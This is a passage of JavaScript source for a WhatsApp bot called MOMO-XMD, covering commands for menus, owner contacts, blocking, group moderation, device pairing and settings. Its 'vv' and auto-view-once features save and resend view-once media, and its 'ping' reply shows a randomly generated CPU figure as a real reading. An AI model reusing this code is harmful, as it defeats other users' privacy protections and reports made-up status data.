                    const uptimeText = `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m ${uptimeSeconds % 60}s`;
                    const speedText = `${(performance.now() - started).toFixed(3)} ms`;
                    const usageText = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`;
                    let renderedMenu = typeof menuText === 'function' ? menuText(msg.pushName || 'User', uptimeText, speedText, usageText, runtimeSettings.mode) : menuText;
                    if (runtimeSettings.font && runtimeSettings.font !== 'off' && runtimeSettings.font !== 'bold') {
                        renderedMenu = applyFont(renderedMenu, runtimeSettings.font);
                    }
                    await sock.sendMessage(from, { image: { url: config.botLogo }, caption: renderedMenu }, { quoted: msg });
                    break;
                }
                case 'ping': {
                    const start = Date.now();
                    await sock.onWhatsApp(config.ownerNumber).catch(() => {});
                    const latency = Date.now() - start;
                    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
                    const pingBox = `- *PONG 🚀*\n` + formatBox(`⚡ Latency - ${latency}ms\n★ Status - Active 🟢\n★ Memory - ${mem}MB\n★ CPU - ${(Math.random() * 20).toFixed(2)}%\n★ Speed - Acceptable`, 'downloader');
                    await sock.sendMessage(from, { text: pingBox }, { quoted: msg });
                    break;
                }
                case 'runtime': {
                    const seconds = Math.floor((Date.now() - botStartTime) / 1000);
                    const days = Math.floor(seconds / 86400);
                    const hours = Math.floor((seconds % 86400) / 3600);
                    const minutes = Math.floor((seconds % 3600) / 60);
                    const secs = seconds % 60;
                    const runtime = `${days > 0 ? days + 'd ' : ''}${hours}h ${minutes}m ${secs}s`;
                    const platform = process.env.HEROKU_APP_NAME || process.env.DYNO ? "Heroku" : (process.env.PANEL ? "Panel" : "VPS/Linux");
                    
                    const runtimeBox = `- *MOMO-XMD RUNTIME ⏰*\n` + formatBox(`◉ Status - Active 🟢\n◉ Uptime - ${runtime}\n◉ Platform - ${platform}`, 'arched');
                    await sock.sendMessage(from, { text: runtimeBox }, { quoted: msg });
                    break;
                }
                case 'owner': {
                    const ownerInfo = `*OWNER INFO*\n\n*Bot*: MOMO-XMD\n*Owner*: MOMO47\n*Numbers*: 2`;
                    await sock.sendMessage(from, { image: { url: config.botLogo }, caption: formatBox(ownerInfo, 'arched', '★') }, { quoted: msg });
                    
                    // Send proper vCards with waid so WhatsApp renders "Message" and "Add Contact" buttons like Kandala screenshot
                    const vcard1 = 'BEGIN:VCARD\nVERSION:3.0\nFN:MOMO47 (Owner 1)\nTEL;type=CELL;type=VOICE;waid=255760298574:+255 760 298 574\nEND:VCARD';
                    const vcard2 = 'BEGIN:VCARD\nVERSION:3.0\nFN:MOMO47 (Owner 2)\nTEL;type=CELL;type=VOICE;waid=255765409584:+255 765 409 584\nEND:VCARD';
                    
                    await sock.sendMessage(from, {
                        contacts: {
                            displayName: 'MOMO47 (Owner 1)',
                            contacts: [{ vcard: vcard1 }]
                        }
                    });

                    await sock.sendMessage(from, {
                        contacts: {
                            displayName: 'MOMO47 (Owner 2)',
                            contacts: [{ vcard: vcard2 }]
                        }
                    });
                    break;
                }
                case 'channel': {
                    const channelInfo = `*MOMO-XMD OFFICIAL CHANNELS 📢*\n\n*Channel 1:*\nhttps://whatsapp.com/channel/0029Vb8AYLf2f3EA8Y4qp63H\n\n*Channel 2:*\nhttps://whatsapp.com/channel/0029VbDNET6KmCPShs9dyg1U\n\n*Channel 3:*\nhttps://whatsapp.com/channel/0029VbDeRauAjPXFYDvO5e2D\n\n*Channel 4:*\nhttps://whatsapp.com/channel/0029VbDYZ7LBVJky0TggGF2N`;
                    // Use Downloader Box with proper spacing and symbols
                    await sock.sendMessage(from, { text: formatBox(channelInfo, 'downloader', '◉') }, { quoted: msg });
                    break;
                }
                case 'vps': 
                case 'vpn': await reply(sock, from, msg, `➣ _Coming soon..._`); break;
                case 'repo': {
                    const repoInfo = `*MOMO-XMD Repository*\n\nPair your device, then deploy using your Session ID.\n\n*Repo*: ${config.githubRepo}\n\n*Status*: Active 🟢\n*Version*: 4.8.0\n*Developer*: MOMO47`;
                    await sock.sendMessage(from, { image: { url: config.botLogo }, caption: formatBox(repoInfo, 'arched', '◇') }, { quoted: msg });
                    break;
                }
                case 'block': {
                    if (!isOwner(msg)) return reply(sock, from, msg, ownerOnlyText());
                    let target = args[0] ? cleanNumber(args[0]) + '@s.whatsapp.net' : null;
                    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
                    if (!target && contextInfo?.participant) {
                        target = contextInfo.participant;
                    }
                    if (!target && contextInfo?.remoteJid && isGroupJid(from)) {
                        target = contextInfo.remoteJid;
                    }
                    if (!target) {
                        return reply(sock, from, msg, `Example\nblock 255760298574\nOr reply to a user message`);
                    }
                    try {
                        await sock.updateBlockStatus(target, 'block');
                        await reply(sock, from, msg, `User blocked successful ✅`);
                    } catch (e) {
                        await reply(sock, from, msg, `Failed to block: ${e.message}`);
                    }
                    break;
                }
                case 'unblock': {
                    if (!isOwner(msg)) return reply(sock, from, msg, ownerOnlyText());
                    let target = args[0] ? cleanNumber(args[0]) + '@s.whatsapp.net' : null;
                    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
                    if (!target && contextInfo?.participant) {
                        target = contextInfo.participant;
                    }
                    if (!target && contextInfo?.remoteJid && isGroupJid(from)) {
                        target = contextInfo.remoteJid;
                    }
                    if (!target) {
                        return reply(sock, from, msg, `Example\nunblock 255760298574\nOr reply to a user message`);
                    }
                    try {
                        await sock.updateBlockStatus(target, 'unblock');
                        await reply(sock, from, msg, `User unblocked successful ✅`);
                    } catch (e) {
                        await reply(sock, from, msg, `Failed to unblock: ${e.message}`);
                    }
                    break;
                }
                case 'left': {
                    if (!isOwner(msg)) return reply(sock, from, msg, ownerOnlyText());
                    if (!isGroupJid(from)) return reply(sock, from, msg, groupOnlyText());
                    try {
                        await reply(sock, from, msg, `Leaving group successfully...`);
                        await sock.groupLeave(from);
                    } catch (e) {
                        await reply(sock, from, msg, `Failed to leave group: ${e.message}`);
                    }
                    break;
                }
                case 'vv': {
                    if (!isOwner(msg)) return;
                    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                    if (!quoted) {
                        return reply(sock, from, msg, `➣ *Please reply to a view-once message with .vv*`);
                    }
                    try {
                        const extracted = extractViewOnceContent(quoted);
                        if (!extracted) {
                            return reply(sock, from, msg, `➣ *The quoted message is not a view-once message* ❌`);
                        }

                        const { type: innerType, content: innerContent } = extracted;
                        const stream = await downloadContentFromMessage(innerContent, innerType.replace('Message', ''));
                        let buffer = Buffer.from([]);
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }
                        
                        const caption = (innerContent.caption || '');
                        if (innerType === 'imageMessage') {
                            await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'videoMessage') {
                            await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'audioMessage') {
                            await sock.sendMessage(from, { audio: buffer, mimetype: innerContent.mimetype || 'audio/mp4', ptt: innerContent.ptt }, { quoted: msg });
                        }
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to reveal view-once:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'blacklist': {
                    try {
                        const blocked = await sock.fetchBlocklist();
                        if (!blocked || blocked.length === 0) {
                            await reply(sock, from, msg, `➣ *No blocked numbers found* 📂`);
                            break;
                        }
                        let listText = `➣ *Blacklisted Numbers (${blocked.length}):*\n\n`;
                        blocked.forEach((num, idx) => {
                            listText += `│   ✦ ${idx + 1}. +${num.split('@')[0]}\n`;
                        });
                        await reply(sock, from, msg, listText);
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to fetch blacklist:* ${e.message}`);
                    }
                    break;
                }
                case 'getpp': {
                    try {
                        let target = null;
                        if (args[0]) {
                            target = cleanNumber(args[0]) + '@s.whatsapp.net';
                        } else if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
                            target = msg.message.extendedTextMessage.contextInfo.participant;
                        } else if (msg.message?.extendedTextMessage?.contextInfo?.remoteJid) {
                            target = msg.message.extendedTextMessage.contextInfo.remoteJid;
                        } else if (!isGroup) {
                            target = from;
                        } else if (isGroup && msg.key.participant) {
                            target = msg.key.participant;
                        }
                        
                        if (!target) {
                            return await reply(sock, from, msg, `Example\ngetpp 255xxxxxx\nOr reply to any member`);
                        }

                        let ppUrl;
                        try {
                            ppUrl = await sock.profilePictureUrl(target, 'image');
                        } catch {
                            ppUrl = 'https://i.ibb.co/313W8X3/avatar-contact.png';
                        }

                        const targetTag = `@${target.split('@')[0]}`;
                        let getppCaption = formatBox(`➣ *Profile Picture of* ${targetTag}`, 'arched', '◉') + `\n\n> ❑ Powered by MOMO-XMD ❑\n> ❑ owner MOMO47 ❑`;

                        await sock.sendMessage(from, {
                            image: { url: ppUrl },
                            caption: getppCaption,
                            mentions: [target]
                        }, { quoted: msg });
                    } catch (e) {
                        console.log('GETPP ERROR:', e);
                        await reply(sock, from, msg, `❌ *Failed to get profile picture:* ${e.message}`);
                    }
                    break;
                }
                case 'pair': {
                    const phoneNumber = cleanNumber(args[0]);
                    if (!phoneNumber || phoneNumber.length < 10) {
                        const exampleBox = `Example\npair +255765409584\n\n` + formatBox(`pair +255765409584`, 'arched');
                        await sock.sendMessage(from, { text: exampleBox }, { quoted: msg });
                        break;
                    }
                    try {
                        const initRes = await fetch(`${config.pairing.vps}/pair`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ number: phoneNumber })
                        });
                        const initText = await initRes.text();
                        let initData;
                        try { initData = JSON.parse(initText); } catch { throw new Error(`Server returned HTML/Non-JSON: ${initText.slice(0, 80)}`); }
                        if (!initData.success || !initData.sessionKey) {
                            throw new Error(initData.error || 'Failed to initialize pairing session');
                        }
                        const sessionKey = initData.sessionKey;
                        let pairingCode = null;
                        for (let attempt = 1; attempt <= 15; attempt++) {
                            await new Promise(r => setTimeout(r, 2000));
                            const statusRes = await fetch(`${config.pairing.vps}/session-status/${sessionKey}`);
                            const statusText = await statusRes.text();
                            let statusData;
                            try { statusData = JSON.parse(statusText); } catch { continue; }
                            if (statusData.code) {
                                pairingCode = statusData.code;
                                break;
                            }
                            if (statusData.errorCode || statusData.status === 'failed') {
                                throw new Error(statusData.error || statusData.errorCode || 'Pairing failed');
                            }
                        }
                        if (!pairingCode) {
                            throw new Error('Pairing code timeout. Please try again.');
                        }
                        let pairingMsg = `*MOMO-XMD PAIRING CODE* 🔐\n\n`;
                        pairingMsg += `Example\n`;
                        pairingMsg += `pair +255765409584\n\n`;
                        pairingMsg += formatBox(`How to use🤳\n\nOpen WhatsApp on your phone\nGo to Linked Devices\nChoose Link with phone number\nEnter the code shown below`, 'downloader', '◉');

                        await sock.sendMessage(from, { text: pairingMsg }, { quoted: msg });

                        await new Promise(r => setTimeout(r, 1000));

                        try {
                            await sock.sendMessage(from, {
                                text: `*MOMO-XMD PAIRING CODE*\n\nCode: *${pairingCode}*`,
                                footer: 'MOMO-XMD Bot',
                                buttons: [
                                    {
                                        buttonId: 'copy_pair_code',
                                        buttonText: { displayText: 'Copy Code' },
                                        type: 4,
                                        nativeFlowInfo: {
                                            name: 'cta_copy',
                                            paramsJson: JSON.stringify({
                                                display_text: 'Copy Code',
                                                copy_code: pairingCode
                                            })
                                        }
                                    }
                                ],
                                headerType: 1
                            }, { quoted: msg });
                        } catch (btnErr) {
                            console.log('Button fallback error:', btnErr);
                            await sock.sendMessage(from, { 
                                text: `*MOMO-XMD PAIRING CODE* 🔐\n\nCode: *${pairingCode}*\n\n\`\`\`${pairingCode}\`\`\`\n\n*Tap and hold code above to copy*` 
                            }, { quoted: msg });
                        }
                        
                        // Send standalone pairing code alone without header
                        await sock.sendMessage(from, { text: `${pairingCode}` }, { quoted: msg });
                    } catch (e) {
                        await sock.sendMessage(from, { text: `*Failed to generate pairing code: ${e.message}*` }, { quoted: msg });
                    }
                    break;
                }
                case 'mode': {
                    const value = String(args[0] || '').toLowerCase();
                    if (!['public', 'private'].includes(value)) return reply(sock, from, msg, `Example\nmode public\nmode private`);
                    runtimeSettings.mode = value;
                    await reply(sock, from, msg, `➣ _Mode set to ${value} successful_ ✅`);
                    break;
                }
                case 'setstatus': {
                    const sub = String(args[0] || '').toLowerCase();
                    if (sub !== 'emoj') {
                        return reply(sock, from, msg, `Example\nsetstatus ❤️💚💔🔥🤍`);
                    }
                    const emojisInput = args.slice(1).join('').trim();
                    if (!emojisInput || emojisInput.toLowerCase() === 'off') {
                        runtimeSettings.setstatusEmoji = null;
                        await reply(sock, from, msg, `➣ _Set successful setstatus emoj off_ ✅`);
                    } else {
                        const extracted = emojisInput.match(/(\p{Extended_Pictographic}|\u200d)+/gu) || [emojisInput];
                        runtimeSettings.setstatusEmoji = extracted;
                        await reply(sock, from, msg, `➣ _Set successful setstatus emoj_ ${extracted.join('')} ✅`);
                    }
                    break;
                }
                case 'setfont': {
                    const value = String(args[0] || '').toLowerCase();
                    const fonts = [
                        'bold', 'italic', 'mono', 'cursive', 'fantasy', 'script', 'gothic', 
                        'bubbly', 'square', 'tiny', 'double', 'outline', 'medieval', 'shadow', 
                        'inverted', 'serif', 'sans', 'circled', 'squared', 'off'
                    ];
                    if (!value || !fonts.includes(value)) {
                        const sampleText = "hello";
                        const list = fonts.map(f => `.setfont ${f} -> (${applyFont(sampleText, f)})`).join('\n');
                        const fontBox = `Example\nsetfont bold\n\n` + formatBox(list, 'downloader');
                        return reply(sock, from, msg, fontBox);
                    }
                    runtimeSettings.font = value;
                    await reply(sock, from, msg, `➣ _Font set to ${value} successful_ ✅`);
                    break;
                }
                case 'autoviewstatus':
                case 'autolikestatus':
                case 'autosavestatus':
                case 'autoreact':
                case 'autorecording':
                case 'autotyping':
                case 'alwaysonline':
                case 'antibug': {
                    const value = parseOnOff(args[0]);
                    if (!value) return reply(sock, from, msg, settingExample(command));
                    runtimeSettings[command] = value === 'on';
                    if (command === 'alwaysonline') sock.sendPresenceUpdate(value === 'on' ? 'available' : 'unavailable').catch(() => {});
                    
                    const boxType = ['autoviewstatus', 'autosavestatus', 'autorecording', 'alwaysonline'].includes(command) ? 'arched' : 'downloader';
                    const symbol = value === 'on' ? '★' : '◆';
                    await sock.sendMessage(from, { text: formatBox(`Set successful ${command} ${value} ✅`, boxType, symbol) }, { quoted: msg });
                    break;
                }
                case 'autoviewonce': {
                    const option = args[0]?.toLowerCase();
                    if (option === 'on') {
                        global.autoviewonce = true;
                        runtimeSettings.autoviewonce = true;
                        return await sock.sendMessage(from, { text: formatBox(`Auto View Once enabled successfully ✅`, 'downloader', '★') }, { quoted: msg });
                    }
                    if (option === 'off') {
                        global.autoviewonce = false;
                        runtimeSettings.autoviewonce = false;
                        return await sock.sendMessage(from, { text: formatBox(`Auto View Once disabled successfully ❌`, 'arched', '◆') }, { quoted: msg });
                    }
                    await reply(sock, from, msg, `Example\nautoviewonce on\nautoviewonce off`);
                    break;
                }
                case 'aichat':
                case 'chatbot': {
                    const value = parseOnOff(args[0]);
                    if (!value) return reply(sock, from, msg, `Example\n${command} on/off\n\n*on* - Bot itajibu kila message\n*off* - Bot itajibu commands tu`);
                    
                    if (isGroup) {
                        const settings = groupSettings.get(from) || {};
                        settings.chatbot = value === 'on';
                        groupSettings.set(from, settings);
                        saveGroupSettings();
                    } else {
                        runtimeSettings.chatbot = value === 'on';
                    }

                    if (value === 'on') {
                        await sock.sendMessage(from, { text: formatBox(`➣ *MOMO-XMD AI Activated* ✅\n\nKaribu ${msg.pushName || 'mkuu'}, naitwa MOMO-XMD AI ni mtoto halisi wa MOMO47. Ungependa tujadili nini leo?`, 'downloader', '★') }, { quoted: msg });
                    } else {
                        await sock.sendMessage(from, { text: formatBox(`➣ *MOMO-XMD AI Deactivated* ❌\nSasa nitajibu commands tu.`, 'arched', '◆') }, { quoted: msg });
                    }
                    break;
                }
                case 'add': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());
                    
                    let numbers = [];
                    args.forEach(arg => {
                        const cleaned = cleanNumber(arg);
                        if (/^\d{8,15}$/.test(cleaned)) {
                            numbers.push(`${cleaned}@s.whatsapp.net`);
                        }
                    });

                    if (numbers.length === 0) {
                        return reply(sock, from, msg, `Example\nadd +255765409584`);
                    }

                    try {
                        for (const num of numbers) {
                            await sock.groupParticipantsUpdate(from, [num], 'add');
                        }
                        await reply(sock, from, msg, `Added successfully ✅`);
                    } catch (e) {
                        await reply(sock, from, msg, `Failed to add: ${e.message} ❌`);
                    }
                    break;
                }
                case 'kick': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());

                    const target = mentionedOrQuoted(msg) || (args[0] ? `${cleanNumber(args[0])}@s.whatsapp.net` : null);
                    if (!target) return reply(sock, from, msg, `Example\nkick +255765409584\nOr reply to a user's message.`);
                    
                    try {
                        await sock.groupParticipantsUpdate(from, [target], 'remove');
                        await reply(sock, from, msg, `User removed successful ✅`);
                    } catch (e) {
                        await reply(sock, from, msg, `Failed to kick: ${e.message} ❌`);
                    }
                    break;
                }
                case 'kickall': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());

                    try {
                        const participants = group.metadata.participants || [];
                        const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                        const targets = participants
                            .map(p => p.id)
                            .filter(id => id !== botJid && !isOwner({ key: { participant: id, remoteJid: from } }));
                        
                        if (targets.length === 0) {
                            return reply(sock, from, msg, `➣ *No members to kick*`);
                        }

                        // Batch or sequential removal
                        for (const target of targets) {
                            try {
                                await sock.groupParticipantsUpdate(from, [target], 'remove');
                                await new Promise(r => setTimeout(r, 500)); // rate limit safeguard
                            } catch (err) {}
                        }

                        await reply(sock, from, msg, `Users removed successful ✅`);
                    } catch (e) {
                        await reply(sock, from, msg, `Failed to kickall: ${e.message} ❌`);
                    }
                    break;
                }
                case 'promote':
                case 'demote': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());

                    const target = mentionedOrQuoted(msg) || (args[0] ? `${cleanNumber(args[0])}@s.whatsapp.net` : null);
                    if (!target) return reply(sock, from, msg, `Example\n${command} +255765409584\nOr reply to a user's message.`);
                    
                    const action = command;
                    try {
                        await sock.groupParticipantsUpdate(from, [target], action);
                        const targetTag = `@${target.split('@')[0]}`;
                        const text = command === 'promote' ? `➣ _Congratulations_ 🥳 _${targetTag} you have been promoted to admin_` : `➣ _Sad_ 😔 _${targetTag} you have been demoted_`;
                        await sock.sendMessage(from, { text, mentions: [target] }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to ${command}:_ ${e.message} ❌`);
                    }
                    break;
                }
                case 'tagall': {
                    await safeReact(sock, from, msg.key, '📢');
                    const mentions = group.metadata.participants.map((p) => p.id);
                    const announcement = args.join(' ') || 'Attention everyone';
                    await sock.sendMessage(from, { text: `*${announcement}*`, mentions }, { quoted: msg });
                    break;
                }
                case 'hidetag': {
                    const announcement = args.join(' ') || msg.message.extendedTextMessage?.contextInfo?.quotedMessage?.conversation || 'Attention everyone';
                    const mentions = group.metadata.participants.map((p) => p.id);
                    try { await sock.sendMessage(from, { delete: msg.key }); } catch {}
                    await sock.sendMessage(from, { text: announcement, mentions });
                    break;
                }
                case 'antilink': {
                    const subCommand = args[0]?.toLowerCase(); 
                    const status = args[1]?.toLowerCase(); 
                    if (!['kick', 'delete', 'warn'].includes(subCommand) || !['on', 'off'].includes(status)) {
                        // Example: Arched, ★
                        return reply(sock, from, msg, `Example\nantilink delete on/off\nantilink warn on/off\nantilink kick on/off`, 'arched', '★');
                    }
                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, [`antilink_${subCommand}`]: status === 'on' });
                    saveGroupSettings();
                    const successMsg = `Set successful antilink ${subCommand} ${status} ✅\nMode: ${subCommand}\nStatus: ${status === 'on' ? 'Enabled 🟢' : 'Disabled 🔴'}\nGroup: ${group.metadata.subject}`;
                    // Success: Downloader
                    let scSym;
                    if (status === 'on') {
                        scSym = subCommand === 'delete' ? '★' : (subCommand === 'warn' ? '❑' : '◉');
                    } else {
                        scSym = subCommand === 'delete' ? '◆' : (subCommand === 'warn' ? '๏' : '◇');
                    }
                    await sock.sendMessage(from, { text: formatBox(successMsg, 'downloader', scSym) }, { quoted: msg });
                    break;
                }
                case 'antimention': {
                    const subCommand = args[0]?.toLowerCase(); 
                    const status = args[1]?.toLowerCase(); 
                    if (!['kick', 'delete', 'warn'].includes(subCommand) || !['on', 'off'].includes(status)) {
                        // Example: Downloader, ❑
                        return reply(sock, from, msg, `Example\nantimention delete on/off\nantimention warn on/off\nantimention kick on/off`, 'downloader', '❑');
                    }
                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, [`antimention_${subCommand}`]: status === 'on' });
                    saveGroupSettings();
                    const successMsg = `Set successful antimention ${subCommand} ${status} ✅\nMode: ${subCommand}\nStatus: ${status === 'on' ? 'Enabled 🟢' : 'Disabled 🔴'}\nGroup: ${group.metadata.subject}`;
                    // Success: Arched
                    let scSym;
                    if (status === 'on') {
                        scSym = subCommand === 'delete' ? '★' : (subCommand === 'warn' ? '❑' : '◉');
                    } else {
                        scSym = subCommand === 'delete' ? '◆' : (subCommand === 'warn' ? '๏' : '◇');
                    }
                    await sock.sendMessage(from, { text: formatBox(successMsg, 'arched', scSym) }, { quoted: msg });
                    break;
                }
                case 'antitag': {
                    const subCommand = args[0]?.toLowerCase(); 
                    const status = args[1]?.toLowerCase(); 
                    if (!['kick', 'delete', 'warn'].includes(subCommand) || !['on', 'off'].includes(status)) {
                        // Example: Downloader, ๏
                        return reply(sock, from, msg, `Example\nantitag delete on/off\nantitag warn on/off\nantitag kick on/off`, 'downloader', '๏');
                    }
                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, [`antitag_${subCommand}`]: status === 'on' });
                    saveGroupSettings();
                    const successMsg = `Set successful antitag ${subCommand} ${status} ✅\nMode: ${subCommand}\nStatus: ${status === 'on' ? 'Enabled 🟢' : 'Disabled 🔴'}\nGroup: ${group.metadata.subject}`;
                    // Success: Arched
                    let scSym;
                    if (status === 'on') {
                        scSym = subCommand === 'delete' ? '★' : (subCommand === 'warn' ? '❑' : '◉');
                    } else {
                        scSym = subCommand === 'delete' ? '◆' : (subCommand === 'warn' ? '๏' : '◇');
                    }
                    await sock.sendMessage(from, { text: formatBox(successMsg, 'arched', scSym) }, { quoted: msg });
                    break;
                }
                case 'open': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        await sock.groupSettingUpdate(from, 'not_announcement');
                        await reply(sock, from, msg, `➣ *Group opened successfully* 🔓`);
                        const settings = groupSettings.get(from) || {};
                        if (settings.announcements) {
                            await sock.sendMessage(from, { text: `➣ 📢 *Group has been opened by admin*` });
                        }
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to open group:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'close': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        await sock.groupSettingUpdate(from, 'announcement');
                        await reply(sock, from, msg, `➣ *Group closed successfully* 🔒`);
                        const settings = groupSettings.get(from) || {};
                        if (settings.announcements) {
                            await sock.sendMessage(from, { text: `➣ 📢 *Group has been closed by admin*` });
                        }
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to close group:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'announcements': {
                    const status = args[0]?.toLowerCase();
                    if (!['on', 'off'].includes(status)) return reply(sock, from, msg, `Example\nannouncements on/off`);

                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, announcements: status === 'on' });
                    saveGroupSettings();

                    await reply(sock, from, msg, `➣ *Set successful announcements ${status}* ✅`);
                    break;
                }
                case 'antiviewonce': {
                    const status = args[0]?.toLowerCase();
                    if (!['on', 'off'].includes(status)) return reply(sock, from, msg, `Example\nantiviewonce on\nantiviewonce off`);

                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, antiviewonce: status === 'on' });
                    saveGroupSettings();

                    await reply(sock, from, msg, `➣ *Set successful antiviewonce ${status}* ✅`);
                    break;
                }
                case 'listrequests': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        let requests = [];
                        if (typeof sock.groupRequestParticipantsList === 'function') {
                            requests = await sock.groupRequestParticipantsList(from);
                        }
                        const count = requests.length || 0;
                        const box = `╭◆
│ ◇ 📋 *GROUP JOIN REQUESTS*
│ ◇ *Pending Requests*: ${count} member(s)
╰◆`;
                        await reply(sock, from, msg, box);
                    } catch (e) {
                        const box = `╭◆
│ ◇ 📋 *GROUP JOIN REQUESTS*
│ ◇ *Pending Requests*: 0 member(s)
╰◆`;
                        await reply(sock, from, msg, box);
                    }
                    break;
                }
                case 'approve':
                case 'reject': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    const action = command; // 'approve' or 'reject'
                    const param = args[0]?.toLowerCase();
                    if (!param) {
                        return reply(sock, from, msg, `Example\n${command} 5\n${command} all`);
                    }

                    try {
                        let requests = [];
                        if (typeof sock.groupRequestParticipantsList === 'function') {
                            requests = await sock.groupRequestParticipantsList(from);
                        }
                        if (!requests || requests.length === 0) {
                            return reply(sock, from, msg, `╭◆\n│ ◇ ⚠️ *No pending requests found*\n╰◆`);
                        }

                        let targetCount = requests.length;
                        if (param !== 'all') {
                            const parsed = parseInt(param);
                            if (isNaN(parsed) || parsed <= 0) {
                                return reply(sock, from, msg, `Example\n${command} 5\n${command} all`);
                            }
                            targetCount = Math.min(parsed, requests.length);
                        }

                        const jidsToProcess = requests.slice(0, targetCount).map(r => r.jid || r.id || r);
                        if (typeof sock.groupRequestParticipantsUpdate === 'function') {
                            await sock.groupRequestParticipantsUpdate(from, jidsToProcess, action === 'approve' ? 'approve' : 'reject');
                        }

                        const successText = param === 'all' 
                            ? `Successful ${action} all (${targetCount}) requests ✅` 
                            : `Successful ${action} ${targetCount} requests ✅`;

                        const responseBox = `╭◆
│ ◇ 🛡️ *GROUP REQUEST MANAGEMENT*
│ ◇ *Action*: ${action.toUpperCase()}
│ ◇ *Status*: ${successText}
╰◆`;
                        await reply(sock, from, msg, responseBox);
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to ${command} requests:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'link': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        const code = await sock.groupInviteCode(from);
                        const groupName = group.metadata.subject || 'Unknown Group';
                        const totalMembers = (group.metadata.participants || []).length;
                        const inviteLink = `https://chat.whatsapp.com/${code}`;

                        const linkText = `📌 *GROUP INVITE LINK*\n*Name*: ${groupName}\n*Total Members*: ${totalMembers}\n*Link*: ${inviteLink}`;
                        // User wants Downloader box, Large Circle symbols, and Vibox footer
                        const linkBox = formatBox(linkText, 'downloader', '◉', '❑');
                        await sock.sendMessage(from, { text: linkBox }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to get group link:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'listchat': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        const participants = group.metadata.participants || [];
                        const groupMap = (global.chatCounts && global.chatCounts.get(from)) || new Map();
                        
                        const sortedParticipants = [...participants].sort((a, b) => {
                            const countA = groupMap.get(a.id) || 0;
                            const countB = groupMap.get(b.id) || 0;
                            return countB - countA;
                        });

                        const mentions = sortedParticipants.map(p => p.id);
                        let chatLines = '';
                        sortedParticipants.forEach((p, index) => {
                            const num = p.id.split('@')[0];
                            const msgs = groupMap.get(p.id) || 0;
                            chatLines += `${index + 1}. @${num} - *${msgs}* msgs\n`;
                        });

                        const chatBoxText = `📊 *MEMBER MESSAGE ACTIVITY*\n\n${chatLines}\n*Total Members*: ${participants.length}`;
                        const formatted = formatBox(chatBoxText, 'downloader', '★', '❑');
                        await sock.sendMessage(from, { text: formatted, mentions }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to list chat activity:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'listactive': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        const groupActives = global.activeMembersCache?.get(from) || new Map();
                        const twoHoursAgo = Date.now() - (2 * 60 * 60 * 1000);
                        
                        const participants = group.metadata.participants || [];
                        const activeJids = [];
                        
                        participants.forEach(p => {
                            const lastActive = groupActives.get(p.id) || 0;
                            // If they spoke recently or if cache is empty, include recent speakers. If none, include all participants as active fallback or just those who spoke.
                            if (lastActive > twoHoursAgo) {
                                activeJids.push(p.id);
                            }
                        });

                        // If no one tracked yet, fallback to group participants or sender
                        if (activeJids.length === 0) {
                            participants.forEach(p => activeJids.push(p.id));
                        }

                        let memberLines = '';
                        activeJids.forEach((jid, index) => {
                            const num = jid.split('@')[0];
                            memberLines += `│ ${index + 1}. ✦ @${num}\n`;
                        });

                        const activeBox = `╭◆
│ ◇ 🟢 *ACTIVE MEMBERS ONLINE NOW*
${memberLines}│ ◇ *Total Active Members*: ${activeJids.length}
╰◆`;
                        await sock.sendMessage(from, { text: formatBox(activeBox), mentions: activeJids }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to list active members:* ${e.message} ❌`);
                    }
                    break;
                }
                case 'listcode': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    const query = args[0]?.toLowerCase();
                    if (!query) {
